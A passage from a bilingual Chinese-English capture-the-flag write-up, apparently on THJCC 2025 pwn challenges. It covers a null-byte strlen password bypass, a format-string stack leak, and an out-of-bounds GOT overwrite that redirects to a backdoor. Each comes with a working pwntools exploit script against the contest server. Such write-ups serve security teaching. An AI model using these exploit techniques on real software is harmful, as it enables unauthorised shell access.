</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">check_password</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Wrong password!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">check_password</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>check_password會以字串長度當作判斷依據</p>
<blockquote>
<p>弱點:<code>strlen</code>會把<code>\x00</code>判定為字串結尾</p>
</blockquote>
<p>所以送出<code>\x00</code>就可以getshell了</p>
<hr>
<p>The <code>check_password</code> function uses the string length as the criteria for judgment.</p>
<blockquote>
<p>Vulnerability: <code>strlen</code> treats <code>\x00</code> as the end of the string.</p>
</blockquote>
<p>Therefore, sending <code>\x00</code> can lead to getting shell access.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;chal.ctf.scint.org&#34;</span><span class="p">,</span> <span class="mi">10004</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div>

<h3 class="relative group">Once 
    <div id="once" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#once" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>字串<code>secret</code>被存在stack上，我們要想辦法leak出他<br>
The string <code>secret</code> is stored on the stack. We need to figure out a way to leak it out.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;guess &gt;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%15s&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Your guess: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Are you sure? [y/n] &gt;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%1c&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">is_sure</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">is_sure</span> <span class="o">==</span> <span class="sc">&#39;y&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">secret</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Correct answer!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Incorrect answer</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Correct answer is %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">secret</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>這邊有一個無限loop可以讓我們確認輸入的資訊，但問題就出在這上面<br>
There is an infinite loop here that allows us to confirm the input information, but the issue lies in this part.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Your guess: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span></code></pre></div><p>這邊就給了一個format string bug<br>
我們可以透過<code>%?$p</code>來以指標形式(8 bytes的十六進位)印出第?個參數<br>
根據linux x64 calling convention<br>
stack的值會從6開始</p>
<p>Here, we have a format string bug.<br>
We can use <code>%?$p</code> to print the ?-th parameter as a pointer (8 bytes in hexadecimal).<br>
According to the Linux x64 calling convention, the values on the stack start from index 6.</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-1.png"
        alt="alt text"
      />
      
    </figure>
</p>
<p>我們要取<code>secret</code>位於<code>rsp + 0x10</code>、<code>rsp + 0x18</code>
所以可以用<code>%8$p</code>和<code>%9$p</code>來得到<code>secret</code></p>
<p>We want to get <code>secret</code> located at <code>rsp + 0x10</code> and <code>rsp + 0x18</code>.<br>
So, we can use <code>%8$p</code> and <code>%9$p</code> to retrieve <code>secret</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;chal.ctf.scint.org&#34;</span><span class="p">,</span> <span class="mi">10002</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">secret</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;guess &gt;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;%8$p&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Your guess: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">rec</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">secret</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">rec</span><span class="p">,</span> <span class="mi">16</span><span class="p">),</span> <span class="mi">64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Are you sure? [y/n] &gt;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;n&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;guess &gt;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;%9$p&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Your guess: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">rec</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">secret</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">rec</span><span class="p">,</span> <span class="mi">16</span><span class="p">),</span> <span class="mi">64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Are you sure? [y/n] &gt;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;n&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;secret: </span><span class="si">{</span><span class="n">secret</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;guess &gt;&#34;</span><span class="p">,</span> <span class="n">secret</span><span class="p">[:</span><span class="mi">15</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Are you sure? [y/n] &gt;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;y&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div>

<h3 class="relative group">bank clerk 
    <div id="bank-clerk" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#bank-clerk" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>It got unintended:(</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">accounts</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
</span></span></code></pre></div><p><code>accounts</code>位於全域變數<br>
<code>accounts</code> is located in global variables.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">choice</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">deposit</span><span class="p">(</span><span class="n">id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">choice</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">withdraw</span><span class="p">(</span><span class="n">id</span><span class="p">);</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">deposit</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter the amount to deposit&gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%u&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">accounts</span><span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="o">+=</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Deposited %u$ to account %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">amount</span><span class="p">,</span> <span class="n">id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter the amount to withdraw&gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%u&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">amount</span> <span class="o">&gt;</span> <span class="n">accounts</span><span class="p">[</span><span class="n">id</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;ERROR! Current balance: %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">accounts</span><span class="p">[</span><span class="n">id</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">accounts</span><span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="o">-=</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Withdrew %u$ from account %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">amount</span><span class="p">,</span> <span class="n">id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>發現有 <code>oob read/write</code><br>
Discovered <code>out-of-bounds read/write</code></p>


<h4 class="relative group">找offset 
    <div id="%E6%89%BEoffset" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#%E6%89%BEoffset" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">amount</span> <span class="o">&gt;</span> <span class="n">accounts</span><span class="p">[</span><span class="n">id</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;ERROR! Current balance: %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">accounts</span><span class="p">[</span><span class="n">id</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>這段允許我們oob read，只要給的值夠大<br>
This part allows us to perform out-of-bounds read, as long as the given value is large enough</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-5.png"
        alt="alt text"
      />
      
    </figure>

接下來我們要嘗試leak出<code>backdoor()</code>的address，可以看附近有什麼東西可以用<br>
我這邊選<code>data段+0x58</code></p>
<p>Next, we want to try leaking the address of <code>backdoor()</code>, and check if there&rsquo;s anything nearby we can use<br>
Here, I chose <code>data segment + 0x58</code></p>


<h4 class="relative group">改got 
    <div id="%E6%94%B9got" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#%E6%94%B9got" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-3.png"
        alt="alt text"
      />
      
    </figure>


    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        src="/posts/thjcc-2025/image-4.png"
        alt="alt text"
      />
      
    </figure>

got jump slot是<code>rw</code><br>
我們可以嘗試竄改jump slot來跳到<code>backdoor()</code></p>
<p>The GOT jump slot is <code>rw</code>,<br>
so we can try to overwrite the jump slot to redirect execution to <code>backdoor()</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">deposit</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%u&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">accounts</span><span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="o">+=</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>這個函數允許我們把<code>account[id]</code>改成任意值
我們需要修改兩次才能把選定的jump slot改到我們想要的地址<br>
所以選擇我選擇改<code>sleep</code></p>
<p>This function allows us to modify <code>account[id]</code> to any value.<br>
We need to modify it twice to fully overwrite the chosen jump slot to our desired address.<br>
So, I chose to overwrite <code>sleep</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;chal.ctf.scint.org&#39;</span><span class="p">,</span> <span class="mi">10003</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Your choice&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;id&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter the amount to deposit&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Your choice&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;id&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter the amount to withdraw&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">dso_handle_addr_h</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="o">-</span><span class="mi">9</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dso_handle_addr_l</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="o">-</span><span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">dso_handle_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">dso_handle_addr_h</span> <span class="o">&lt;&lt;</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">|</span> <span class="n">dso_handle_addr_l</span>
</span></span><span class="line"><span class="cl"><span class="n">backdoor_addr</span> <span class="o">=</span> <span class="n">dso_handle_addr</span> <span class="o">-</span> <span class="mh">0x4058</span> <span class="o">+</span> <span class="mh">0x1250</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;backdoor_addr: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">backdoor_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">backdoor_addr_h</span> <span class="o">=</span> <span class="n">backdoor_addr</span> <span class="o">&gt;&gt;</span> <span class="mh">0x20</span>
</span></span><span class="line"><span class="cl"><span class="n">backdoor_addr_l</span> <span class="o">=</span> <span class="n">backdoor_addr</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sleep_addr_h</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="o">-</span><span class="mi">13</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep_addr_l</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="o">-</span><span class="mi">14</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">diff_h</span> <span class="o">=</span> <span class="p">(</span><span class="n">backdoor_addr_h</span> <span class="o">-</span> <span class="n">sleep_addr_h</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span></span><span class="line"><span class="cl"><span class="n">diff_l</span> <span class="o">=</span> <span class="p">(</span><span class="n">backdoor_addr_l</span> <span class="o">-</span> <span class="n">sleep_addr_l</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sleep_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">sleep_addr_h</span> <span class="o">&lt;&lt;</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">|</span> <span class="n">sleep_addr_l</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;sleep_addr: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">sleep_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="o">-</span><span class="mi">14</span><span class="p">,</span> <span class="n">diff_l</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="o">-</span><span class="mi">13</span><span class="p">,</span> <span class="n">diff_h</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leak</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div>

<h4 class="relative group">unintend solve 
    <div id="unintend-solve" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#unintend-solve" aria-label="Anchor">#</a>
